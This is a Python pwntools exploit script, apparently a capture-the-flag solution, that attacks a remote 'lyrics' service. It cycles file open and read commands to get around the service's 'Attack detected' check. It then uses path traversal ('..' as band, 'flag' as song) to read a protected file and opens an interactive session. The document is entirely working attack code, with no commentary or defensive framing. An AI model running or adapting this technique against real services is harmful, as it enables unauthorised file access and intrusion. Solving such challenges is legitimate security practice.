#!/usr/bin/env python

from pwn import *
from struct import *
import re, base64
from pprint import *


__LIBC__ = ""
__NAME__ = ""
__REMOTE__ = "lyrics.hackable.software"
__REMOTE_PORT__ = 4141
__GDB__ = """
"""

if __name__ == "__main__":

	log.info("pwning %s"  % __NAME__)

	r = remote(__REMOTE__, __REMOTE_PORT__)

	def freeOne():
		
		while (1):

			r.sendline("read")
			r.sendline("15")
			d = r.recvuntil("Comma", drop=1)

			if '[-] Attack detected' in d:
				break
	
	def allocOkFile():

		r.sendline("open")
		r.sendline("Pink Floyd")
		r.sendline("Another Brick in the Wall")
		d = r.recvuntil("Command>")
	

	def allocFile():

		r.sendline("open")
		r.sendline("..")
		r.sendline("lyrics")

		d = r.recvuntil("Command>")

	allocOkFile()

	for i in range(0, 26):

		r.sendlineafter("nd>", "read")
		r.sendlineafter("ID: ", "0")

		d = r.recvuntil("Comma", drop=1)

		log.info("%d %s" % (i, d))

	for i in range(0, 14):

		allocOkFile()

	allocFile()

	for i in range(0, 16):
		log.info("TRY %d/12..." % i)
		
		if i == 12:

			freeOne()

			r.sendlineafter("> ", "open")
			r.sendlineafter("Band: ", "..")
			r.sendlineafter("Song: ", "flag")

			r.sendlineafter("Command>", "read")
			r.sendlineafter("ID: ", "15")

			r.sendlineafter("Command>", "read")
			r.sendlineafter("ID: ", "0")

			r.interactive()

		freeOne()
		allocFile()

	r.interactive()

